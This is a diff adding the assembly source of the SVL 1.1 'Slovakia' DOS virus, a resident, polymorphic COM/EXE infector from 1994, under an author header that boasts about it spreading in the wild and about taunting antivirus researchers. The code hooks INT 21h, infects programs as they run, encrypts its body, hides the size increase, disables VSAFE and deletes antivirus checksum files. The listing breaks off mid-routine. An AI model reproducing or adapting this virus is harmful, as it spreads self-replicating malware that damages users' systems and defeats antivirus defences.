@@ -1,0 +1,976 @@
+;***********************************************************************
+;***** BEFORE READING THE SOURCE OR COMPILING , READ THIS !!! **********
+;***********************************************************************
+
+; THIS VIRUS WAS WRITTEN IN 12/93 - 1/94 SO DON'T BE SUPRISED, IF IT'S
+; DETECTED BY ALL OF THE BETTER AV-PROGRAMS. THE SVL 1.x FAMILY OF VIRUSES
+; WERE ( AND STILL ARE ) IN THE WILD. VX HAS A GOOD POLYMORPHIC ENGINE ,
+; SIMPLE SEMI-STEALTH, BUT IS RATHER POORLY OPTIMISED :(
+
+; NAME       : SVL 1.1   
+
+; FAMILY MEMBERS : SVL 1.0 
+;                  SVL 1.1  ... was the bugfix for 1.0
+;                  SVL 1.2  ... i can't remember what was new here
+;                  SVL.KILL ... this isn't our work, this version
+;                               rewrites sectors of HD at random
+
+; ALIASES    : SlovakiaII , New_Slovakia
+
+; AUTHORS    : JX , proffesor , mengele - members of SVL
+
+; ORIGIN     : .sk aka Slovakia aka Slovak republic
+
+; RELEASED   : Jan , 1994
+
+; REFERENCES : AVPVE links this virus as SlovakiaII to the Slovak family.
+;              That's wrong, of course :) . Another AVPVE mistake is
+;              saying that virus contains strings like 'SlovakiaII.3584a'
+;              and 'SlovakiaII.3584b' . I am sure there are no such
+;              strings in the sources . It looks like somebody tried to
+;              recompile sources which we released to our friends.
+
+; TYPE       : - resident COM & EXE infector 
+;              - infection on exe
+;              - int 21 hooked
+;              - semi-stealth
+;              - prints fake message
+ 
+; REMOVAL METHODS : various , e.g. formating HD, but our choice is 
+;                   to ftp to ftp.elf.stuba.sk /pub/pc/sac/svl.zip ,
+;                   where u can get a nice remover.
+
+; POSTDISCOVERY HISTORY : after beeing in the wild for 11 months, we
+;                         decided to show our goodwill to the AV-boyz
+;                         and send them sources, but as they
+;                         should have work very hard for their money,
+;                         they got no disc or e-mail with the source. They
+;                         got the sources printed on paper . :)))))
+;                         Just imagine the situation : u have to re-type
+;                         30 pages. I think they were very happy !
+;                         I wish I could have seen their faces as they opened
+;                         our special 'delivery'. We also added a letter
+;                         which can u find in VLAD#4 in article called
+;                         Slovakia by Qark.
+
+; WE STRONGLY RECCOMEND THE STRATEGY DESCRIBED ABOVE FOR DRIVING SOME VIRUS
+; RESEARCHERS MAD. IF YOUR VIRUS HAS HUGE SOURCES, TRY IT. TRY TO INCLUDE 
+; SOME BUGS IN SUCH SPECIAL SOURCES. MAKE THE AV TYPE IT !!! 
+; THEY'LL BE HAPPY !!!
+
+; Gretings to : VYVOJAR , _COKE_ , SEPULTURA , KDKD , TUIR , MMIR , MJunkie
+;               DARKMAN , QARK , METABOLIS , VLAD , IR and all from #v
+
+;                and to our favourite FRED FLINTSTONE
+
+; special greetings to PFC fredey - army is cool , or isn't it ? :)))
+; / now u have time to code this promised 'super perfect mega virus ' /
+
+; Tymto specialne pozdravujem Mira Trnku a prajem mu,aby mu rubrika vydrzala
+; az do dochodkoveho veku . Stava sa na Slovensku pomaly kultovou postavou a
+; zopar ludi mu asi chce vytvorit fanklub . Prosim pana Hubinskeho aby na -
+; tychto par viet M.T upozornil ... he - he - he
+
+; /MSG Blesk gimme know where're u , or mail us .
+
+; As information should be free , we'll welcome all kind of them ...
+; Do not allow the net censorship !!!
+
+;  JX/SVL  MGL / SVL  proffesor/SVL   and freshman blesk/SVL
+
+;   P.S :           Don't PaniX !!!!!!!!!!!!!!!!!!!
+;
+;------------------------- cut here ---------------------------------------
+.model tiny
+.286
+.code
+	
+	 mov ah,9h        ; Carrier file
+	 push cs
+	 pop ds
+	 mov dx,offset LLL1
+	 int 21h
+	 mov ah,4ch     
+	 int 21h
+LLL1:    db "I$"
+;***************************************************************************
+DECST:   mov ax,1h      ;Decryptor
+	 mov bx,20h
+DEC1:    mov cx,0000h
+	 xor word ptr cs:[bx+0],cx
+	 inc bx
+	 inc bx
+	 dec ax
+	 jnz DEC1
+;***************************************************************************
+START:   mov si,0020h      ; Flexible entry point
+	 mov di,si         ; SI holds offset of START.
+	 add di,13h
+	 push ds           ; Store segments
+	 push es
+	 push cs           ;DS=CS.
+	 pop ds 
+	 jmp TRACE1
+AAAY:    mov byte ptr ds:[di],0h
+AAAX:    jmp INST1
+;---------------------------------
+	 mov ah,4ch               
+	 int 21h
+;---------------------------------
+INST1:   mov ah,04h          ; Display message on screen (1-4.8)
+	 int 1ah
+	 cmp dh,01h
+	 jnz INST2
+	 cmp dl,3h
+	 jnc INST2
+
+	 mov dx,si
+	 add dx,offset INSTTXT1-offset START
+	 mov ah,09h
+	 int 21h
+	 mov ah,01h           ; Clear cursor
+	 mov ch,20h
+	 int 10h
+	 mov ah,86h           ; wait for a while
+	 mov cx,0020h
+	 mov dx,0fffh
+	 int 15h
+INST2:
+;---------------------------------
+	 cmp byte ptr ds:[si+TYPFILE-START],2h   ; COM or EXE file ?
+	 jnz INST2C
+;---------------------------------
+	 mov ax,es     ; calculate segment for EXE file 
+	 add ax,10h
+	 push ax
+NNCS:    add ax,0000h   ; add REL_CS, from original EXE header.
+	 mov word ptr ds:[si+JMPCS-START],ax   ; prepare jump to original
+	 pop ax                                ; entry point
+NNSS:    add ax,0000h   ; add REL_SS, from original EXE header.
+	 mov word ptr ds:[si+INSTSS-START+1h],ax  ;restore STACK segment
+	 jmp INSTZV
+;---------------------------------
+INST2C:  mov ax,cs
+	 mov word ptr ds:[si+JMPCS-START],ax
+	 mov word ptr ds:[si+JMPIP-START],100h
+	 push si
+	 cld
+	 mov cx,3h
+	 mov di,100h
+	 add si,offset ZACCOM-START
+	 rep movsb
+	 pop si
+;---------------------------------
+INSTZV:  mov ah,30h        ; get DOS version
+	 int 21h
+	 cmp al,4h         ; we dont go resitent 
+	 jnc INST4         ; if dos version is bellow 4.0
+	 jmp INSTEND
+;---------------------------------
+INST4:   mov cx,4321h
+	 mov ah,54h       ; Instalation check
+	 int 21h
+	 cmp bx,0EEE1h
+	 jnz INST5
+	 jmp INSTEND
+;---------------------------------
+INST5:   mov ax,es       ;Test if program MCB is last
+	 dec ax
+	 mov es,ax
+	 cmp byte ptr es:[0000h],5ah
+	 jz INST6
+	 jmp INSTEND
+;---------------------------------
+INST6:   mov bx,word ptr es:[0003h]  ; calculate where we place virus
+	 sub bx,100h                 ; from MCB.
+	 mov dx,es
+	 add dx,bx
+	 inc dx
+;---------------------------------
+	 mov ax,cs        ; do we have enough memory ?
+	 cmp byte ptr ds:[si+TYPFILE-START],2h  ; COM or EXE file.
+	 jnz INST7
+	 add ax,0101h     ; add our size in para +1.
+NNMIN:   add ax,0000h     ; add MINMEM from  EXE-FILE header
+	 jmp INST8 
+INST7:   add ax,1000h  
+INST8:   cmp dx,ax
+	 jc INSTEND                 
+;---------------------------------
+	 mov word ptr es:[0003h],bx    ; cut MCB by 4kB.
+	 mov ax,es                     
+	 inc ax
+	 mov es,ax
+	 mov ax,word ptr es:[0002h]  
+	 sub ax,100h
+	 mov word ptr es:[0002h],ax
+;---------------------------------
+	 push si            ; move body to the top of memory in VIRSEG.
+	 mov cx,0e00h
+	 push cs
+	 pop ds
+	 mov es,dx          ; ES holds VIRSEG.
+	 xor di,di
+	 rep movsb
+	 pop si
+;---------------------------------
+	 xor ax,ax
+	 mov ds,ax
+	 sub word ptr ds:[413h],4h      ;subtract BIOSMEMSIZE by 4..
+	 mov ax,word ptr ds:[21h*4h]    ;hook INT 21h
+	 mov word ptr es:[HPVECT21-START],ax
+	 mov ax,word ptr ds:[21h*4h+2h]
+	 mov word ptr es:[HPVECT21-START+2h],ax
+	 mov ax,es
+	 cli
+	 mov word ptr ds:[21h*4h],offset SIZESTE-START
+	 mov word ptr ds:[21h*4h+2h],ax
+	 sti
+;---------------------------------
+INSTEND: xor ax,ax       ;prepare register for exec.
+	 xor bx,bx
+	 xor cx,cx
+	 xor dx,dx
+	 xor bp,bp
+	 xor di,di
+	 cmp byte ptr cs:[si+TYPFILE-START],2h      ;COM or EXE file.
+	 jnz INSTENDC
+;---------------------------------
+	 xor si,si     
+	 pop es        
+	 pop ds
+	 sahf                     
+	 cli
+INSTSP:  mov sp,0000h    ;Set original stack.
+INSTSS:  mov ax,0000h    ;for EXE file.
+	 mov ss,ax
+	 sti
+	 xor ax,ax
+JMINS:   db 0eah         ;Leave virus loader.
+JMPIP:   db 00h
+	 db 00h
+JMPCS:   db 00h
+	 db 00h
+;--------------------------------
+INSTENDC:xor si,si     ; start original COM file.
+	 pop es        ; restore segments pointing to PSP.
+	 pop ds
+	 sahf          ; clear  FLAGs.
+	 jmp JMINS     ; and exit from here
+;--------------------------------
+HPVECT21:dw 0h           ;INT 21h
+	 dw 0h
+INSTTXT1:db 0dh,0ah,"I'am SLOVAKIA virus  Version 1.2 Copyright"
+	 db " (c) 1994 SVL",0dh,0ah,"$"
+TYPFILE: db 2h   ;Typ s£b. ktor˜ nesie v¡r. (0-povel. preklada‡,1-COM,2-EXE.)
+ZACCOM:  db 0h,0h,0h   ;Data na za‡iatku p“v. COM s£b.
+;****************************************************************************
+REGDX:   dw 0h    ; offseyt of path to file (fn. EXEC).
+REGDS:   dw 0h    ; segment of path to file (fn. EXEC).
+NUMBDSK: db 0h    ; drive number
+IDFILE:  db 0h    ; file indentifier (0,1-COM,2-EXE).
+PARAMVS: db 0h    ; VSAFE parameters
+AKTHNDL: dw 0h    ; handle of opened file
+TIMEHP:  dw 0h    ; here we store time 
+DATEHP:  dw 0h    ; date of victim
+TABHEAD: db 1ch dup(0) ;where exe file header 'll be
+SIZESEG: dw 0h    ; filesize (DX*65536)+AX.
+SIZEOFF: dw 0h    ; AX
+ATR:     dw 0h    ; attributes
+DTX1:    db "chklist.ms ",0h
+DTX2:    db "chklist.cps",0h
+DTX3:    db "smartchk.cps",0h
+DTX4:    db "svl.svl",0h
+ASIZEVIR:dw 0h     ; counter for write
+CODETP:  db 0h     ; type of decryption
+NCDX:    dw 0h     ; decryption key
+STEASZAX:dw 0h     ; file size
+STEASZDX:dw 0h     ; file size
+;rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
+SIZESTE:  pushf          ; Start of resident part
+;--------------------------
+	  pusha                
+	  mov bp,sp
+	  mov ax,word ptr ss:[bp+22d]
+	  test ax,0000001000000000b
+	  jz OBNIF
+	  mov bh,0fbh
+	  jmp OBNIF1
+OBNIF:    mov bh,0fah
+OBNIF1:   mov byte ptr cs:[FLEG1-START],bh
+	  mov byte ptr cs:[FLEG2-START],bh
+	  mov byte ptr cs:[FLEG3-START],bh
+	  mov byte ptr cs:[FLEG4-START],bh
+	  popa
+;--------------------------
+	  cmp ah,4eh
+	  jz SI1ST
+	  cmp ah,4fh
+	  jnz SIA
+;-------------------------------------------------------------------------
+SI1ST:    popf       ;handle int 21h FIND 1st FILE, FIND nxt FILE
+	  pushf               ;via handle( fn. 4e, 4f. )
+	  call dword ptr cs:[HPVECT21-START]
+	  pushf
+	  pusha
+	  push es
+	  jc SI1STE
+;-------------------------
+	  mov ah,2fh       ;INT 21h fn. 2fh GET DTA.
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+
+	  mov ax,word ptr es:[bx+18h]    
+	  shr ax,9h                ; AX holds year
+	  cmp ax,64h            ;  is infected ?
+	  jc SI1STE
+;--------------------------
+	  mov ax,0e00h           ;  sizefile-ax.
+	  sub word ptr es:[bx+1ah],ax        ;
+	  jnc SI1ST2                         ; hide virus ...
+	  dec word ptr es:[bx+1ah+2h]
+SI1ST2:   jmp SI1STE
+;--------------------------
+SI1STE:   pop es
+	  popa
+	  popf
+FLEG1:    sti
+	  retf 02
+;-------------------------------------------------------------------------
+SIA:      cmp ah,11h
+	  jz SIFC
+	  cmp ah,12h
+	  jnz SIEND
+;-------------------------------------------------------------------------
+SIFC:     popf       ; handle INT 21h, FN 11H, 12h  FND FILE FCB
+	  pushf            
+	  call dword ptr cs:[HPVECT21-START]
+	  pushf
+	  pusha
+	  push es
+	  cmp al,0h
+	  jnz SIFCE     ; error !
+;-----------------------
+	  mov ah,2fh            ; get DTA.
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  cmp byte ptr es:[bx],0ffh ;is FCB extended ?
+	  jz SIFC1
+;-----------------------
+SIFC3:    mov ax,word ptr es:[bx+19h]    ; is date changed ?
+	  shr ax,9h                      ; Normal FCB.
+	  cmp ax,64h
+	  jc SIFCE
+	  mov ax,0e00h           ; hide virus 
+	  sub word ptr es:[bx+1dh],ax        
+	  jnc SIFC2                          ; cut size by ax bytes
+	  dec word ptr es:[bx+1dh+2h]
+SIFC2:    jmp SIFCE
+;-----------------------
+SIFC1:    add bx,7h           ; FCB is extended , skip garbage
+	  jmp SIFC3
+;-----------------------
+SIFCE:    pop es
+	  popa
+	  popf
+FLEG2:    sti
+	  retf 02
+;-------------------------------------------------------------------------
+SIEND:    cmp ah,54h     ; instalation check
+	  jnz SIEND1
+	  cmp cx,4321h
+	  jnz SIEND1
+	  popf
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  mov bx,0eee1h
+FLEG3:    sti
+	  retf 02
+;-------------------------------------------------------------------------
+;-------------------------------------------------------------------------
+SIEND1:   cmp ah,4bh       ; fn EXEC. 
+	  jz ZAV0          ; here we infect files
+	  jmp SIEND2
+ZAV0:     cmp al,00h
+	  jz ZAV1
+	  jmp SIEND2
+;---------------------
+ZAV1:     pusha
+	  push ds
+	  push es
+;---------------------
+	  mov word ptr cs:[REGDX-START],dx   ; store path to file
+	  mov word ptr cs:[REGDS-START],ds   ; (fn. EXEC)
+;-------------------------------------------------------------------------
+	  mov bx,dx      ; test , what drive is it 
+	  push ds        ; we infects only local HDs.
+	  push dx
+	  mov dl,byte ptr ds:[bx]  
+	  mov dh,byte ptr ds:[bx+1h] 
+	  cmp dh,3ah      ; contains path drive letter ? (d:)
+	  jz ZAV2
+;---------------------
+	  mov ah,19h    ; get current drive
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  inc al
+	  mov dl,al
+	  jmp ZAV4
+;---------------------          
+ZAV2:     cmp dl,60h      ; calculate drive number from ASCII 
+	  jnc ZAV3
+	  sub dl,40h
+	  jmp ZAV4 
+ZAV3:     sub dl,60h          
+;---------------------
+ZAV4:     mov byte ptr cs:[NUMBDSK-START],dl ; store drive number
+	  mov ah,1ch                  ; HD or  FD ?
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  cmp al,0ffh        ; error ?
+	  jz ZAV444
+	  cmp byte ptr ds:[bx],0f8h     ;Test ID byte of disk FAT (F8-HD).
+	  jnz ZAV444 
+;---------------------
+	  mov bl,byte ptr cs:[NUMBDSK-START]  ; is drive local ?
+	  mov ax,4409h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jc ZAV444
+	  test dx,1000h
+	  jnz ZAV444
+;---------------------
+	  stc             ;Disk is ok :)
+	  jmp ZAV444E
+;---------------------
+ZAV444:   clc             ; wrong drive :(
+ZAV444E:  pop dx
+	  pop ds          
+;-------------------------------------------------------------------------
+	  jc ZAV5
+	  jmp ZAVE
+;---------------------
+ZAV5:     mov ah,62h      ; test if actual process is AV
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]    
+	  dec bx
+	  push ds
+	  mov ds,bx
+	  mov si,08h
+	  call FINDSTR           
+	  pop ds
+	  jnc ZAV6
+	  jmp ZAVE 
+;---------------------
+ZAV6:     call CHKASCIIZ     ;Test if file (path ds:dx) is COM or EXE
+	  jnc ZAV7           ; and if is AV or not
+	  jmp ZAVE 
+ZAV7:     jz ZAV8            ; set indentificator for actual file
+	  mov byte ptr cs:[IDFILE-START],1h
+	  jmp ZAV9
+ZAV8:     mov byte ptr cs:[IDFILE-START],2h
+;---------------------
+ZAV9:     push ds            ; fuck VSAFE  (Msdos 6.0). 
+	  push dx
+	  mov ax,0fa02h
+	  mov dx,5945h
+	  mov bl,0h
+	  int 21h
+	  mov byte ptr cs:[PARAMVS-START],cl
+	  pop dx
+	  pop ds
+;---------------------
+	  mov ax,4300h   ; getfile attribs
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]     
+	  jnc ZAV9A
+	  jmp ZAVEVSF
+ZAV9A:    mov word ptr cs:[ATR-START],cx                         
+;---------------------
+	  mov ax,3d00h       ;open file (Read only). just check it 
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jnc ZAV10
+	  jmp ZAVEVSF
+;---------------------
+ZAV10:    mov bx,ax          ; get date
+	  mov word ptr cs:[AKTHNDL-START],bx
+	  mov ax,5700h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jnc ZAV11
+	  jmp ZAVECHNDL
+ZAV11:    mov word ptr cs:[TIMEHP-START],cx    ;and store date & time.
+	  mov word ptr cs:[DATEHP-START],dx
+	  shr dx,9h       ; is file infected (date is +100 years ).
+	  cmp dx,64h        
+	  jc ZAV12
+	  jmp ZAVECHNDL
+;---------------------
+ZAV12:    mov ah,3fh      ;get 1Ch bytes from file start 
+	  push cs
+	  pop ds
+	  mov cx,1ch
+	  mov dx,offset TABHEAD-START
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jnc ZAV13
+	  jmp ZAVECHNDL
+;---------------------
+ZAV13:    mov ax,4202h     ; get lenght
+	  xor cx,cx         
+	  xor dx,dx
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jnc ZAV14
+	  jmp ZAVECHNDL
+;----------------------
+ZAV14:    mov word ptr ds:[SIZESEG-START],dx     ; store lenght
+	  mov word ptr ds:[SIZEOFF-START],ax        
+	  cmp dx,0h         ; isn't file too short ?
+	  jnz ZAV15
+	  cmp ax,400h
+	  jnc ZAV15
+	  jmp ZAVECHNDL
+ZAV15:    cmp byte ptr ds:[IDFILE-START],2h    ; or too long ?
+	  jz ZAV17
+	  cmp ax,0eff0h   ; COM size check
+	  jc ZAV18          
+	  jmp ZAVECHNDL
+ZAV17:    cmp dx,7h       ; EXE size check
+	  jc ZAV16
+	  jmp ZAVECHNDL
+ZAV16:    push bx
+	  push ax
+	  mov cx,dx       ; match EXE file size in header with
+	  mov ax,80h      ; real size ?   
+	  xor dx,dx
+	  mul cx
+	  mov bx,ax
+	  pop ax
+	  mov cx,200h
+	  xor dx,dx
+	  div word ptr cx
+	  xor dx,0h
+	  jz ZAV16A
+	  inc ax
+ZAV16A:   add ax,bx
+	  cmp word ptr ds:[TABHEAD-START+4h],ax
+	  pop bx
+	  jz ZAV18
+	  jmp ZAVECHNDL  
+;---------------------
+ZAV18:    cmp byte ptr ds:[IDFILE-START],2h    ; is EXE file for
+	  jnz ZAV19                            ; macrosoft fensters ? (MSWIN)
+	  mov si,offset TABHEAD-START
+	  cmp word ptr ds:[si+18h],40h
+	  jc ZAV19
+	  jmp ZAVECHNDL
+;---------------------
+ZAV19:    mov ah,3eh        ; close file
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jnc ZAV20
+	  jmp ZAVECHNDL 
+;----------------------------------------------------------------------
+ZAV20:    call ANLPATH        ; delete unfriendly files (CPAV,MSAV).
+	  push cs             ;chklist.ms .
+	  pop ds
+	  mov di,si
+	  mov si,offset DTX1-START
+	  mov cx,0fh
+	  rep movsb  
+	  call ZAV20PRC
+;---------------------
+	  call ANLPATH
+	  push cs              ;chklist.cps
+	  pop ds
+	  mov di,si
+	  mov si,offset DTX2-START
+	  mov cx,0fh
+	  rep movsb
+	  call ZAV20PRC
+;---------------------
+	  call ANLPATH        ;smartchk.cps.
+	  push cs
+	  pop ds
+	  mov di,si
+	  mov si,offset DTX3-START
+	  mov cx,0fh
+	  rep movsb
+	  call ZAV20PRC  
+	  jmp ZAV21  
+;---------------------
+ZAV20PRC: mov ah,41h        ; i love this function
+	  mov dx,0e00h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  ret 
+;----------------------------------------------------------------------
+;----------------------------------------------------------------------
+ZAV21:    mov ds,word ptr cs:[REGDS-START]    ; normal attribs
+	  mov dx,word ptr cs:[REGDX-START]
+	  mov ax,4301h
+	  mov cx,0h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jnc ZAV22
+	  jmp ZAVEVSF
+;---------------------
+ZAV22:    call ANLPATH       ; rename exe,com FILE to  
+	  push cs            ;SVL.svl
+	  pop ds
+	  mov di,si
+	  mov si,offset DTX4-START
+	  mov cx,0fh
+	  rep movsb
+	  mov ds,word ptr cs:[REGDS-START]
+	  mov di,0e00h
+	  mov ah,56h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jnc ZAV23
+	  jmp ZAVEVSF
+;---------------------
+ZAV23:    push cs        ; open file R/w
+	  pop ds   
+	  mov dx,0e00h
+	  mov ax,3d02h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jnc ZAV24
+	  jmp ZAVRENM
+;---------------------
+ZAV24:    mov bx,ax
+	  mov word ptr cs:[AKTHNDL-START],bx
+	  push cs
+	  pop ds
+	  mov ah,byte ptr ds:[IDFILE-START]    ; get indentifier
+	  mov byte ptr ds:[TYPFILE-START],ah
+	  cmp byte ptr ds:[IDFILE-START],2h  ; COM or EXE file.
+	  jz ZAV24XX
+	  jmp ZAV25
+;---------------------
+ZAV24XX:  mov ax,word ptr ds:[TABHEAD+14h-START]   ; save IP.
+	  mov word ptr ds:[JMPIP-START],ax
+	  mov ax,word ptr ds:[TABHEAD+16h-START]   ; save CS.
+	  mov word ptr ds:[NNCS+1h-START],ax
+	  mov ax,word ptr ds:[TABHEAD+10h-START]   ; save SP.
+	  mov word ptr ds:[INSTSP+1h-START],ax
+	  mov ax,word ptr ds:[TABHEAD+0eh-START]   ; save SS.
+	  mov word ptr ds:[NNSS+1h-START],ax
+;---------------------
+	  mov cx,word ptr ds:[TABHEAD+8h-START]    ; calculate new REL_CS,IP.
+	  shl cx,4h         ; CX= header size
+	  mov ax,word ptr ds:[SIZEOFF-START]    ; file size
+	  mov dx,word ptr ds:[SIZESEG-START]
+	  cmp ax,cx
+	  jz ZAV25B
+	  jnc ZAV25C
+	  sub cx,ax
+	  mov ax,0ffffh
+	  sub ax,cx
+	  inc ax
+	  dec dx
+	  jmp ZAV25E
+
+ZAV25B:   xor ax,ax
+	  jmp ZAV25E
+
+ZAV25C:   sub ax,cx
+;---------------------
+ZAV25E:   push ax       ; ax+dx*(65536) is EXE size
+	  mov cx,dx        ; get REL_CS,IP.
+	  xor dx,dx
+	  mov ax,1000h
+	  mul cx
+	  mov bx,ax
+	  pop ax
+	  xor dx,dx
+	  mov cx,10h
+	  div word ptr cx
+	  add ax,bx
+;---------------------
+	  mov word ptr ds:[TABHEAD+16h-START],ax ; EXE header new REL_CS.
+	  mov word ptr ds:[TABHEAD+0eh-START],ax ; header new REL_SS.
+	  mov word ptr ds:[TABHEAD+14h-START],dx ; header new IP.
+	  mov word ptr ds:[TABHEAD+10h-START],1200h ; new SP.
+;---------------------
+	  mov ax,word ptr ds:[TABHEAD+0ah-START]    ; handle MINMEM a MAXMEM.
+	  add ax,70h
+	  mov word ptr ds:[TABHEAD+0ah-START],ax
+	  mov word ptr ds:[TABHEAD+0ch-START],0ffffh
+;---------------------
+ZAV25K:   mov word ptr ds:[NNMIN+1h-START],ax
+	  mov word ptr ds:[TABHEAD+12h-START],0h ; clear checksum
+	  mov ax,word ptr ds:[TABHEAD+4h-START]  ; add virus size
+	  add ax,7h                              ; in pages
+	  mov word ptr ds:[TABHEAD+4h-START],ax
+	  jmp ZAV26
+;---------------------
+ZAV25:    mov cx,3h               ; store first 3 bytes from COM
+	  mov si,offset TABHEAD-START
+	  push cs
+	  pop es
+	  mov di,offset ZACCOM-START
+	  rep movsb
+	  mov ax,word ptr ds:[SIZEOFF-START]   ; jump parametes
+	  push ax
+	  add ax,100h
+	  mov dx,ax
+	  pop ax
+	  sub ax,3h
+	  mov byte ptr ds:[TABHEAD-START],0e9h
+	  mov word ptr ds:[TABHEAD+1h-START],ax
+;---------------------
+ZAV26:    mov ax,dx        ; generate decryptor
+	  mov cx,1600d
+	  push dx
+	  mov dx,0e00h
+	  call MDEVICE
+	  pop dx
+	  mov byte ptr ds:[CODETP-START],bh  ; decryption type
+	  mov word ptr ds:[ASIZEVIR-START],ax   ; write counter
+	  mov word ptr ds:[NCDX-START],cx         ; key
+	  add dx,ax
+	  mov word ptr ds:[START+1h-START],dx ; FLEXIBLE ENTRY point.
+	  mov byte ptr ds:[AAAX+1h-START],04h 
+;---------------------
+	  push ax
+	  mov bx,word ptr ds:[AKTHNDL-START]
+	  mov ax,4202h         ; lseek end
+	  xor cx,cx
+	  xor dx,dx
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  pop cx
+	  jnc OPKOD
+	  jmp ZAVENW
+;---------------------
+OPKOD:    mov ah,40h        ;WRITE decryptor
+	  mov dx,0e00h
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jnc OPKOD1
+	  jmp ZAVENW
+;---------------------
+OPKOD1:   xor cx,cx       ; encrypt body and appent it to end
+	  mov dx,3200d    ; size of body
+	  xor si,si
+	  mov di,0e00h
+;---------------------
+ZAV27S:   mov ax,word ptr ds:[si]
+	  cmp byte ptr ds:[CODETP-START],1h
+	  jz ZAV28
+	  jnc ZAV27
+	  xor ax,word ptr ds:[NCDX-START]     ;XOR
+	  jmp ZAV29
+ZAV27:    add ax,word ptr ds:[NCDX-START]     ;SUB
+	  jmp ZAV29
+ZAV28:    sub ax,word ptr ds:[NCDX-START]     ;ADD
+;---------------------
+ZAV29:    mov word ptr ds:[di],ax
+	  sub dx,2h
+	  add word ptr ds:[ASIZEVIR-START],2h
+	  add di,2h
+	  add si,2h
+	  add cx,2h
+	  cmp dx,0h
+	  jnz ZAV29AX
+	  jmp ZAV29AY
+ZAV29AX:  cmp cx,200h
+	  jnz ZAV27S
+;---------------------
+ZAV29AY:  push dx
+	  mov ah,40h         ; write to file
+	  mov dx,0e00h
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  pop dx
+	  jc ZAVENW
+	  cmp dx,0h
+	  jz ZAV30
+	  mov di,0e00h
+	  mov cx,0h
+	  jmp ZAV27S
+;---------------------
+ZAV30:    push ds            ; generate additional bytes 
+	  push bx
+	  mov ah,0h
+	  int 1ah
+	  cmp dx,0feffh
+	  jc ZAV30TY
+	  mov dx,0feffh
+ZAV30TY:  mov si,dx
+	  mov ax,0h
+	  mov ds,ax
+	  mov di,0e00h
+	  mov cx,200h
+	  rep movsb
+	  pop bx
+	  pop ds
+
+	  mov cx,0e00h      ; padd virus to 3,5 kB.
+	  sub cx,word ptr ds:[ASIZEVIR-START]
+	  mov dx,0e00h
+	  mov ah,40h
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jc ZAVENW
+;---------------------
+	  mov ax,4200h       ; lseek start 0
+	  xor cx,cx
+	  xor dx,dx          ; 2 years ago we didn't use cwd :)
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jc ZAVENW
+;---------------------         ;Write 1c bytes to file start
+	  mov ah,40h
+	  mov cx,1ch
+	  mov dx,offset TABHEAD-START
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jc ZAVENW
+;---------------------
+	  mov cx,word ptr ds:[TIMEHP-START]    ; mark DATE = DATE +100 years
+	  mov dx,word ptr ds:[DATEHP-START]
+	  push dx
+	  shr dx,9h
+	  add dx,64h
+	  shl dx,9h
+	  pop ax
+	  and ax,0000000111111111b
+	  or dx,ax
+	  mov ax,5701h
+	  pushf
+	  call dword ptr ds:[HPVECT21-START]
+	  jc ZAVENW
+;---------------------
+ZAVENW:   mov ah,3eh                          ;Close handle.
+	  mov bx,word ptr cs:[AKTHNDL-START]
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+;---------------------
+ZAVRENM:  call ANLPATH      ; rename SVL.svl back to original
+	  push cs
+	  pop ds
+	  mov di,si
+	  mov si,offset DTX4-START
+	  mov cx,0fh
+	  rep movsb
+	  mov dx,0e00h
+	  mov di,word ptr cs:[REGDX-START]
+	  mov es,word ptr cs:[REGDS-START]
+	  mov ah,56h
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+;---------------------
+	  push es         ; restore attribs
+	  pop ds
+	  push di
+	  pop dx
+	  mov ax,4301h
+	  mov cx,word ptr cs:[ATR-START]
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jmp ZAVEVSF
+;-----------------------------------------------------------------------
+;-----------------------------------------------------------------------
+ZAVECHNDL:mov ah,3eh
+	  mov bx,word ptr cs:[AKTHNDL-START]
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+;---------------------
+ZAVEVSF:  mov dx,5945h      ; restore VSAFE.
+	  mov ax,0fa02h
+	  mov bl,byte ptr cs:[PARAMVS-START]
+	  int 21h
+ZAVE:     pop es
+	  pop ds
+	  popa
+	  jmp SIENDCE
+;-------------------------------------------------------------------------
+;-------------------------------------------------------------------------
+SIEND2:   cmp ax,4202h      ;fn. LSEEK 
+	  jz LLLH           ; want they file size or what ?
+	  jmp SIENDCE
+LLLH:     cmp cx,0h
+	  jz LLLH1
+	  jmp SIENDCE
+LLLH1:    cmp dx,0h
+	  jz OOPR
+	  jmp SIENDCE
+;---------------------
+OOPR:     popf
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jc SSSE
+	  pushf
+	  pusha
+	  push es
+	  push ds
+;---------------------
+	  mov word ptr cs:[STEASZAX-START],ax     ; save file size
+	  mov word ptr cs:[STEASZDX-START],dx
+	  mov ax,5700h      ; check date
+	  pushf
+	  call dword ptr cs:[HPVECT21-START]
+	  jc SSSRE
+	  shr dx,9h       ; is file infected ? ( + 100 years).
+	  cmp dx,64h
+	  jc SSSRE
+;---------------------
+	  mov ah,62h      ;Test  for AV activity
